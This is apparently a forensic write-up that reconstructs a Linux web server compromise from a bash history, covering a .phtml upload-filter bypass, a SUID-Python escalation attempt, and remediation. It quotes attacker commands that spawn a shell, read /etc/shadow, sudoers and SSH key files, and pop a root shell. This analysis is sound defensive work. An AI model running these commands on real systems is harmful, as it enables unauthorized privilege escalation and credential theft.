# Linux Web Server Compromise: Upload Filter Bypass and SUID Escalation Attempt

The provided material is a bash history log from a compromised Linux web server. The server enforced input sanitization intended to block malicious `.php` uploads, yet data from it was later found for sale. The task is to reconstruct the activity from the history and explain how that control was defeated.

## The upload filter bypass

The clearest artifact is the final line, where a file is removed from the web server's upload directory.

```bash
rm /var/www/html/uploads/x.phtml
```

The file is `x.phtml`, not `x.php`. The sanitization described in the brief rejects `.php`, but a `.phtml` file placed in a writable upload directory is a well-known way around a filter that only matches the literal `.php` string, because `.phtml` is commonly mapped to the PHP interpreter by the web server's handler configuration. The log does not name the web server or show the file's contents, so its role as an executing webshell is the analytical conclusion the evidence points to, not something the history proves directly. What the log does establish is that a non-`.php` file existed in the upload directory and was deleted at the end of the session. That extension gap is the bypass the brief asks about.

## Interactive shell and local enumeration

The history includes the standard technique for turning limited code execution into a usable terminal, which is catalogued on GTFOBins.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

A long enumeration phase follows: locating interpreters and compilers, reading account, sudo, network and SSH-key files, and downloading linux-exploit-suggester to look for escalation paths.

```bash
find / -name perl* ; find / -name python* ; find / -name gcc*
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
cat /etc/passwd
cat /etc/sudoers
cat ~/.ssh/authorized_keys
```

## Privilege escalation attempts

Two separate routes to root appear. An early `su root` (near the start of the session) and, much later, a SUID search followed by the GTFOBins SUID-Python one-liner.

```bash
cat /etc/shadow
find / -type f -user root -perm -4000 2>/dev/null
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves privileges and only has an effect if the interpreter is SUID-root, so the operator was clearly targeting a SUID Python. The log neither shows python's permissions nor any command output, so whether python was actually SUID, and whether either escalation succeeded, cannot be confirmed from this history alone. Note also that the read of `/etc/shadow` is entered before the SUID-Python line, not after it, so it cannot be treated as confirmation that the escalation worked. It is an attempt whose result the log does not record.

No exfiltration command appears in the history. The brief states the data was sold, but the mechanism by which it left the host is not present in this evidence.

## Root cause

The failure is a single, narrow control with nothing behind it. The sanitization matched one file extension while the web server treated other extensions as executable PHP, and the host appears to have offered a SUID interpreter as a local escalation path. A denylist on one attribute, at one layer, with no restriction on interpreter execution or SUID binaries beneath it.

## Remediation

- Allowlist permitted upload extensions rather than denylisting `.php`, and validate file content by signature rather than filename.
- Confirm the web server does not map `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, or `.pht` to the PHP interpreter.
- Store uploads outside the web root, or serve the upload directory with script execution disabled.
- Audit SUID-root binaries against least privilege and remove the bit from interpreters such as Python.
- Apply egress filtering to block outbound fetches like the exploit-suggester download.
- Add file integrity monitoring on the upload directory.